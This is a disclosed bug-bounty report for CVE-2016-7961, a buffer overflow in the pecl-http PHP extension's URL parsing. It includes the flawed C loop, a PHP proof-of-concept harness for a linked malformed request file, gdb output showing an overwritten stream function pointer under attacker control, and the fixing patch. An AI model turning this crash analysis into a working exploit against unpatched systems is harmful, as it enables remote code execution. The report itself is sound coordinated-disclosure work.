# Buffer overflow in HTTP parse_hostinfo(), parse_userinfo() and parse_scheme()

## Report Details
- **Report ID**: 174069
- **URL**: https://hackerone.com/reports/174069
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2016-10-05T12:08:41.367Z
- **Disclosed**: 2017-05-30T15:13:49.305Z

## Reporter
- **Username**: rc0r
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ibb

## Vulnerability Information
Since the original report is still marked as private in the PHP bug tracker please find the copy & pasted bug report below (edited for readability and to include correct bug tracker id). See the references section for a link to the issue in the PHP bug tracker!

The maintainer already fixed the issue in the public git repo using the proposed patch included in the original report. Fixed versions 3.1.0RC1 and 2.6.0RC1 of the pecl-http extension have been released as well.

Mitre assigned **CVE-2016-7961** for this issue.

# Description

The parsing functions of the PECL HTTP extension allow overflowing a buffer with data originating from an arbitrary HTTP request. Affected are the `parse_hostinfo()`, `parse_userinfo()` and `parse_scheme()` functions in `php_http_url.c` that may get called when instantiating/initializing an HTTP message object. The problem occurs because in the main processing loop `char *ptr` may get incremented past the corresponding end pointer `char *end` used as the end marker. Thus the parser loop may continue to execute and buffer `state->buffer` may overflow.  

Relevant code snippet from `php_http_url.c:1096`:

```c
static ZEND_RESULT_CODE parse_hostinfo(struct parse_state *state, const char *ptr)
{
[...]
    if (ptr != end) do {
        switch (*ptr) {
            [...]
            case '0': case '1': case '2': case '3': case '4': case '5': case '6':
            case '7': case '8': case '9':
                /* allowed */
                if (port) {
                    state->url.port *= 10;
                    state->url.port += *ptr - '0';
                } else {
                    label = ptr;
                    state->buffer[state->offset++] = *ptr;
                }
                break;
            [...]
            default:
            [...]
                } else if (!(mb = parse_mb(state, PARSE_HOSTINFO, ptr, end, tmp, state->flags & PHP_HTTP_URL_SILENT_ERRORS))) {
                    if (!(state->flags & PHP_HTTP_URL_IGNORE_ERRORS)) {
                        return FAILURE;
                    }
                    break;
                }
                label = ptr;
                ptr += mb - 1;  // ptr increased here as in various other locations
        }
    } while (++ptr != end);     // ptr pre-incremented -> check condition may be missed!
[...]
```

# Security impact and PoC

Since this bug allows to overwrite quite large parts of memory arbitrary code execution seems very likely. In [1] you'll find a malformed HTTP request that demonstrates the issue:

```php
$ cat http_message_parse.php
/*
        http_message_parse.php
        bug73185.bin
        http://hlt99.blinkenshell.org/php/bug73185.bin
*/
<?php
    $http_msg = new http\Message(file_get_contents("bug73185.bin"), false);
?>
```

```
$ ./configure --enable-raphf --enable-propro --with-http && make
$ gdb ./sapi/cli/php
gdb> r http_message_parse.php
[...]
Fatal error: Uncaught http\Exception\BadMessageException: http\Message::__construct(): Could not parse HTTP protocol version 'HTTP/1.rdrd-vvv5:##HT
[...] // garbled output
85:#~t? HTT in http_message_parse.php on line 7

Program received signal SIGSEGV, Segmentation fault.
0x00000000006d6ef3 in _php_stream_free (stream=<optimized out>, close_options=11)
    at /home/rc0r/tmp/php-src/main/streams/streams.c:467
467			ret = stream->ops->close(stream, preserve_handle ? 0 : 1);
gdb> i r
rax            0x4142434445464748	4702394921427289928
rbx            0xb	11
rcx            0x1	1
rdx            0x0	0
rsi            0x1	1
rdi            0x7ffff42ad300	140737289835264
rbp            0x7ffff42ad300	0x7ffff42ad300
rsp            0x7fffffffb150	0x7fffffffb150
r8             0x0	0
r9             0x1	1
r10            0x3d3	979
r11            0x7ffff58ad760	140737312905056
r12            0x0	0
r13            0x1	1
r14            0x0	0
r15            0x0	0
rip            0x6d6ef3	0x6d6ef3 <_php_stream_free+307>
eflags         0x10202	[ IF RF ]
cs             0x33	51
ss             0x2b	43
ds             0x0	0
es             0x0	0
fs             0x0	0
gs             0x0	0
gdb> x/i $rip
=> 0x6d6ef3 <_php_stream_free+307>:	callq  *0x10(%rax)
```

The attempt to parse the supplied HTTP request fails at some point and used resources are freed by the extension. It was possible to overwrite a `php_stream` structure including its pointer to a `php_stream_ops` structure containing function pointers that are about to be called from within `_php_stream_free()` as shown above. Register `rax` contains data from the malformed HTTP request starting at offset 0x2139. 

[1] http://hlt99.blinkenshell.org/php/005-bug73185.bin

# Patch

After careful review by the project maintainers the following patch may be used to fix the reported issue.  

```c
From ec2d2e1648127b2a0bb15f10144daca59bc6f03c Mon Sep 17 00:00:00 2001
From: rc0r <hlt99@blinkenshell.org>
Date: Mon, 26 Sep 2016 21:34:29 +0200
Subject: [PATCH] Buffer overflow in parse_hostinfo() fixed

---
 src/php_http_url.c | 4 ++--
 1 file changed, 2 insertions(+), 2 deletions(-)

diff --git a/src/php_http_url.c b/src/php_http_url.c
index 2332fb5..70e4c2c 100644
--- a/src/php_http_url.c
+++ b/src/php_http_url.c
@@ -1107,7 +1107,7 @@ static ZEND_RESULT_CODE parse_hostinfo(struct parse_state *state, const char *pt
    }
 #endif
 
-	if (ptr != end) do {
+	if (ptr < end) do {
        switch (*ptr) {
        case ':':
            if (port) {
@@ -1235,7 +1235,7 @@ static ZEND_RESULT_CODE parse_hostinfo(struct parse_state *state, const char *pt
            label = ptr;
            ptr += mb - 1;
        }
-	} while (++ptr != end);
+	} while (++ptr < end);
 
    if (!state->url.host) {
        len = state->offset - len;
-- 
2.10.0
```

# Versions known to be affected

pecl-http extension versions up to and including:

* 3.1.0beta2 (PHP 7)
* 2.6.0beta2 (PHP 5)

# Timeline

2016-09-27  Initial report to PHP bug tracker (#73185)
2016-10-04  Issue fixed in git repository, CVE requested
2016-10-04  Maintainer released fixed pecl-http extensions 3.1.0RC1 and 2.6.0RC1
2016-10-05  Mitre assigned CVE-2016-7961

# References

https://bugs.php.net/bug.php?id=73185
https://github.com/m6w6/ext-http/commit/e096f45ff30a46d6a8e96da7bc6334d2ac5ab7c2

https://pecl.php.net/package/pecl_http/3.1.0RC1
https://pecl.php.net/package/pecl_http/2.6.0RC1

http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-7961

## Attachments
No attachments
